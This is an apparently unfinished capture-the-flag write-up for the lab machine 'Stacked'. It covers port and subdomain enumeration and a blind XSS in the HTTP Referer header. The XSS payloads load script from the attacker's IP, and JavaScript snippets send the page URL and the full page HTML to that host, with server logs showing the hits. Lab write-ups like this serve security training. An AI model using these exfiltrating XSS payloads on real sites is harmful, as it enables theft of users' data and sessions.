# Stacked

# Enumeration

````
nmap -sV -p- --min-rate 1000 -oA nmap-10.10.11.112-sV 10.10.11.112
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 06:40 EDT
Nmap scan report for stacked.htb (10.10.11.112)
Host is up (0.15s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41
2376/tcp open  ssl/docker?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
````

````
# wfuzz -H "Host: FUZZ.stacked.htb" -u http://stacked.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hw 26
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://stacked.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                     
=====================================================================

000001183:   200        444 L    1779 W     30268 Ch    "portfolio" 
````

Free Download button

* http://portfolio.stacked.htb/files/docker-compose.yml
````yml
version: "3.3"

services:
  localstack:
    container_name: "${LOCALSTACK_DOCKER_NAME-localstack_main}"
    image: localstack/localstack-full:0.12.6
    network_mode: bridge
    ports:
      - "127.0.0.1:443:443"
      - "127.0.0.1:4566:4566"
      - "127.0.0.1:4571:4571"
      - "127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}"
    environment:
      - SERVICES=serverless
      - DEBUG=1
      - DATA_DIR=/var/localstack/data
      - PORT_WEB_UI=${PORT_WEB_UI- }
      - LAMBDA_EXECUTOR=${LAMBDA_EXECUTOR- }
      - LOCALSTACK_API_KEY=${LOCALSTACK_API_KEY- }
      - KINESIS_ERROR_PROBABILITY=${KINESIS_ERROR_PROBABILITY- }
      - DOCKER_HOST=unix:///var/run/docker.sock
      - HOST_TMP_FOLDER="/tmp/localstack"
    volumes:
      - "/tmp/localstack:/tmp/localstack"
      - "/var/run/docker.sock:/var/run/docker.sock"
````

## XSS on HTTP Referer

````js
<script>document.location="http://10.10.15.6/blah"</script>
````

````http
POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 77
Origin: http://portfolio.stacked.htb
Connection: close
Referer: <script>document.location="http://10.10.15.6/blah"</script>

fullname=Blah&email=blah%40bla.com&tel=012345678901&subject=blah&message=blah
````

````sh
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.112 - - [21/Mar/2022 09:32:46] code 404, message File not found
10.10.11.112 - - [21/Mar/2022 09:32:46] "GET /blah HTTP/1.1" 404 -
````

Instead of redirecting the entire page it is possible to load the JS from attacker's server
````js
Referer: <script src="http://10.10.15.6/xss.js"></script>
````

````
10.10.11.112 - - [21/Mar/2022 09:48:06] code 404, message File not found
10.10.11.112 - - [21/Mar/2022 09:48:06] "GET /xss.js HTTP/1.1" 404 -
````

Discover document path
````js
//xss-1
var exfilreq = new XMLHttpRequest();    
//void open(DOMString method, DOMString url, optional boolean async, optional DOMString? user, optional DOMString? password);
exfilreq.open("GET", "http://10.10.14.6/" + document.location, false);    
exfilreq.send();
````

````js
Referer: <script src="http://10.10.15.6/xss-1.js"></script>
````

````
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.112 - - [21/Mar/2022 09:56:06] "GET /xss-1.js HTTP/1.1" 200 -
10.10.11.112 - - [21/Mar/2022 09:56:45] code 404, message File not found
10.10.11.112 - - [21/Mar/2022 09:56:45] "GET /http://mail.stacked.htb/read-mail.php?id=2 HTTP/1.1" 404 -
````

Dump full HTML
````js
//xss-2
var exfilreq = new XMLHttpRequest();    
exfilreq.open("POST", "http://10.10.15.6:9001/", false);    
exfilreq.send(document.documentElement.outerHTML); 
````

# User

# Root

# Secrets
